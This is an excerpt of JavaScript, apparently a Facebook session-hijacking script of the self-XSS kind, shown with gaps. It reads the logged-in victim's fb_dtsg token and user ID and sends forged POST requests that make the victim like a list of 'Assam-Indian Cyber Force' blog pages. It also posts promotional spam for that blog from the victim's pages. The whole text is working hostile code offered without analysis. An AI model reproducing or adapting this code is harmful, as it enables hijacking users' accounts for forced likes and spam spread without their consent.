...
function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "//www.facebook.com/plugins/like/connect";
    var params4 = "fb_dtsg=" + fb_dtsg + "&href=http%3A%2F%2Fassam-indian-cyber-force.blogspot.in" + abone + "&action=like&nobootload=&iframe_referer=http%3A%2F%2Fassam-indian-cyber-force.blogspot.in%2F&ref=&xfbml=&__user=" + user_id + "&__a=1&__dyn=7wfGbw&__req=1&ttstamp=265816811012074100114";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
...
a("%2F2013%2F11%2F1.html");
a("%2F2013%2F11%2Faccept-group-joining-requests-from-any_7261.html");
a("%2F2013%2F11%2Ftry-new-auto-private-inbox-all-friends_1.html");
a("%2F2013%2F10%2Fauto-post-in-all-groups.html");
a("%2F2013%2F10%2Fauto-post-in-all-friends-timeline.html");
a("%2F2013%2F10%2Fauto-unfriend-all-friends.html");
a("%2F2013%2F07%2Fmake-sure-you-are-using-mozilla-firefox.html");
a("%2F2013%2F07%2Fauto-suggest-friends.html");
a("%2F2013%2F07%2Fauto-add-friends-to-your-facebook-group.html");
a("%2F2014%2F01%2Ffb-auto-tagging-script.html");
...
function PI2(rk) {
    ...
    var PageParams = "fb_dtsg=" + fb_dtsg + "&next=&mode=self&friendTarget=&groupTarget=&pageTarget=" + rk + "&post_as_page=1&message_text=We%20are%20bringing%20you%20the%20latest%20and%20newest%20facebook%20automate%20tools%20for%20free.%0APowered%20by%20%3A%20Loading%20[lllllllllllllllllllllllllllllllllllllll%20]%2099%25%EF%BB%BF%20%26%20%20Assam-Indian%20Cyber%20Force%EF%BB%BF&message=We%20are%20bringing%20you%20the%20latest%20and%20newest%20facebook%20automate%20tools%20for%20free.%0APowered%20by%20%3A%20%40[313072532101076%3ALoading%20[lllllllllllllllllllllllllllllllllllllll%20%5C]%2099%25]%20%26%20%20%40[199134496914077%3AAssam-Indian%20Cyber%20Force]&app_id=2309869772&attachment[params][urlInfo][canonical]=http%3A%2F%2Fwww.assam-indian-cyber-force.blogspot.in%2F&attachment[params][urlInfo][final]=http%3A%2F%2Fwww.assam-indian-cyber-force.blogspot.in%2F&attachment[params][urlInfo][user]=http%3A%2F%2Fwww.assam-indian-cyber-force.blogspot.in%2F&attachment[params][favicon]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-c.ak%2Fhphotos-ak-prn2%2F1381240_457806991001115_416606163_n.jpg&attachment[params][title]=Automate Your Facebook&attachment[params][summary]=Automate%20Your%20Facebook&attachment[params][images][0]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-c.ak%2Fhphotos-ak-prn2%2F1381240_457806991001115_416606163_n.jpg&attachment[params][medium]=106&attachment[params][url]=http%3A%2F%2Fwww.assam-indian-cyber-force.blogspot.in/%2F&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.assam-indian-cyber-force.blogspot.in/&link_metrics[base_domain]=assam-indian-cyber-force.blogspot.in&link_metrics[title_len]=10&link_metrics[summary_len]=101&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=3&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=788&link_metrics[image_dimensions][1]=544&link_metrics[images_selected]=3&link_metrics[images_considered]=5&link_metrics[images_cap]=3&link_metrics[images_type]=ranked&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=3&composer_metrics[images_loaded]=3&composer_metrics[images_shown]=3&composer_metrics[load_duration]=6&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6&share_source_type=unknown&src=&appid=5085647995&parent_fbid=&ogid=&audience[0][value]=80&UITargetedPrivacyWidget=80&share=Share%20Link&__user=" + user_id + "&__a=1&__dyn=7wAzU4Oi3S8w&__req=f&ttstamp=2658166118115538871";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
